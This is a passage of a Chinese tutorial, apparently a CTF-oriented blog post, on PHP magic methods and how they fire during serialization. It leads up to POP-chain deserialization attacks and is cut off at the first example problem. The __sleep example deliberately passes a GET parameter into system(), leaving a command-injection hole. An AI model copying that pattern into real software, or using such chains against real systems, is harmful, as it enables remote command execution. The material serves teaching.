class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__construct</span>()：类的构造函数，对象创建完成后第一个被对象自动调用的方法<br><span class="hljs-built_in">__destruct</span>()：类的析构函数，当对象被销毁时候自动触发<br><span class="hljs-built_in">__call</span>()：在对象中调用一个不可访问方法时调用<br><span class="hljs-built_in">__callStatic</span>()：用静态方式中调用一个不可访问方法时调用<br><span class="hljs-built_in">__get</span>()：获得一个类的成员变量时调用<br><span class="hljs-built_in">__set</span>()：设置一个类的成员变量时调用<br><span class="hljs-built_in">__isset</span>()：当对不可访问属性调用<span class="hljs-built_in">isset</span>()或<span class="hljs-built_in">empty</span>()时调用<br><span class="hljs-built_in">__unset</span>()：当对不可访问属性调用<span class="hljs-built_in">unset</span>()时被调用<br><span class="hljs-built_in">__sleep</span>()：执行<span class="hljs-built_in">serialize</span>()时，先会调用这个函数<br><span class="hljs-built_in">__wakeup</span>()：执行<span class="hljs-built_in">unserialize</span>()时，先会调用这个函数<br><span class="hljs-built_in">__toString</span>()：类被当成字符串时的回应方法<br><span class="hljs-built_in">__invoke</span>()：调用函数的方式调用一个对象时的回应方法<br><span class="hljs-built_in">__set_state</span>()：调用<span class="hljs-built_in">var_export</span>()导出类时，此静态方法会被调用。<br><span class="hljs-built_in">__clone</span>()：当对象复制完成时调用<br><span class="hljs-built_in">__autoload</span>()：尝试加载未定义的类<br><span class="hljs-built_in">__debugInfo</span>()：打印所需调试信息<br></code></pre></td></tr></table></figure><h4 id="construct-destruct"><a href="#construct-destruct" class="headerlink" title="construct&amp;destruct"></a>construct&amp;destruct</h4><p>construct()为构造函数，当创建完一个对象的时候自动触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了构造函数1次&quot;</span> ;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);  <span class="hljs-comment">//此处自动触发__construct</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br>触发了构造函数<span class="hljs-number">1</span>次<br></code></pre></td></tr></table></figure><p>destruct()为析构函数，当对象被销毁时候自动触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了析构函数1次&quot;</span>.<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span> ;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);  <span class="hljs-comment">//此处触发__destruct</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);  <span class="hljs-comment">//此处触发__destruct</span><br><br><span class="hljs-meta">?&gt;</span><br><br>触发了析构函数<span class="hljs-number">1</span>次<br>触发了析构函数<span class="hljs-number">1</span>次<br></code></pre></td></tr></table></figure><h4 id="wakeup-sleep"><a href="#wakeup-sleep" class="headerlink" title="wakeup&amp;sleep"></a>wakeup&amp;sleep</h4><p><strong>sleep</strong>：</p><p>触发时机：序列化serialize()之前</p><p>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性</p><p>参数：成员属性</p><p>返回值：需要被序列化存储的成员属性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;username);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;benben&#x27;</span>];<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>);  <span class="hljs-comment">//此处触发__sleep</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>wakeup</strong>：</p><p>触发时机：反序列化unserialize()之前</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;  <span class="hljs-comment">//此处触发__wakeup</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$user_ser</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="tostring-invoke"><a href="#tostring-invoke" class="headerlink" title="tostring&amp;invoke"></a>tostring&amp;invoke</h4><p><strong>tostring：</strong></p><p>触发时机：把对象当成字符串去调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">         </span>&#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;格式不对，输出不了!&#x27;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;  <span class="hljs-comment">//此处触发__toString</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>把类<code>$User</code>实体化并赋值给<code>$test</code>，此时<code>$test</code>是个对象，调用对象可以使用<code>print_r</code>或者<code>var_dump</code></p><p>如果使用<code>echo</code>或者<code>print</code>只能调用字符串的方式去调用对象，即把对象当成字符串使用，此时触发<code>__toString</code></p><p><strong>invoke：</strong></p><p>触发时机：把对象当成函数调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">         </span>&#123;<br>             <span class="hljs-keyword">echo</span>  <span class="hljs-string">&#x27;它不是个函数!&#x27;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span> -&gt;benben;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>() -&gt;benben;  <span class="hljs-comment">//此处触发__invoke</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>把类<code>User</code>实体化并赋值给<code>$test</code>为对象</p><p>正常输出对象里的值<code>benben</code></p><p>加<code>()</code>是把<code>test</code>当成函数<code>test()</code>来调用，从而触发<code>invoke()</code></p><h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><p>触发时机：调用一个不存在的方法</p><p>参数：2个参数传参</p><p>返回值：调用的不存在的方法的名称和参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt; <span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>);  <span class="hljs-comment">//此处触发__call</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>调用的方法<code>callxxx()</code>不存在，触发魔术方法<code>call()</code></p><p>魔术方法<code>call()</code>传参<code>$arg1</code>、<code>$arg2</code>(callxxx，a)</p><p>$arg1：调用的不存在的方法的名称</p><p>$arg2：调用的不存在的方法的参数</p><h4 id="callStatic"><a href="#callStatic" class="headerlink" title="callStatic"></a>callStatic</h4><p>触发时机：静态调用或调用成员常量时使用的方法不存在</p><p>参数：2个参数传参</p><p>返回值：调用的不存在的方法的名称和参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span>::<span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>);  <span class="hljs-comment">//此处触发__callStatic</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意：静态属性不需要实例化即可调用，因为静态属性存放的位置是在类里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>);  <span class="hljs-comment">//此处触发__callStatic</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>静态调用<code>::</code>时的方法<code>callxxx()</code>不存在</p><p>触发<code>callStatic()</code>传参<code>$arg1</code>，<code>$arg2</code>（callxxx，a）</p><h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><p>触发时机：调用的成员属性不存在</p><p>参数：传参$arg1</p><p>返回值：不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt;var2;  <span class="hljs-comment">//此处触发__get</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>调用的成员属性<code>var2</code>不存在</p><p>触发<code>get()</code>把不存在的属性名称<code>var2</code>赋值给<code>$arg1</code></p><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>触发时机：给不存在的成员属性赋值</p><p>参数：传参$arg1，$arg2</p><p>返回值：不存在的成员属性的名称和赋的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> ,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>.<span class="hljs-string">&#x27;,&#x27;</span>.<span class="hljs-variable">$arg2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt;var2=<span class="hljs-number">1</span>;  <span class="hljs-comment">//此处触发__set</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>给不存在的成员属性<code>var2</code>赋值为<code>1</code>时</p><p>先触发<code>get()</code>再触发<code>set()</code></p><p>$arg1：不存在成员属性的名称</p><p>$arg2：给不存在的成员属性<code>var2</code>赋的值</p><h4 id="isset"><a href="#isset" class="headerlink" title="isset"></a>isset</h4><p>触发时机：对不可访问属性使用<code>isset()</code>或<code>empty()</code>时，<code>isset()</code>会被调用</p><p>参数：传参$arg1</p><p>返回值：不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> </span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);  <span class="hljs-comment">//此处触发__isset</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>isset()</code>调用的成员属性<code>var</code>不可访问或不存在</p><h4 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h4><p>触发时机：对不可访问属性使用<code>unset()</code></p><p>参数：返回<code>$arg1</code></p><p>返回值：不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> </span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);  <span class="hljs-comment">//此处触发__unset</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>unset()</code>调用的成员属性<code>var</code>不可访问或不存在</p><p>触发<code>unset()</code></p><p>返回<code>$arg1</code>不存在成员属性的名称</p><h4 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h4><p>触发时机：当使用<code>clone</code>关键字拷贝完成一个对象后，新对象自动调用定义的魔术方法<code>__clone()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-string">&quot;__clone test&quot;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">clone</span>(<span class="hljs-variable">$test</span>)  <span class="hljs-comment">//此处触发__clone()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>clone()</code>克隆对象完成后，触发魔术方法<code>__clone()</code></p><h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h3><p>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种Payload</p><p><strong>例题一：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span 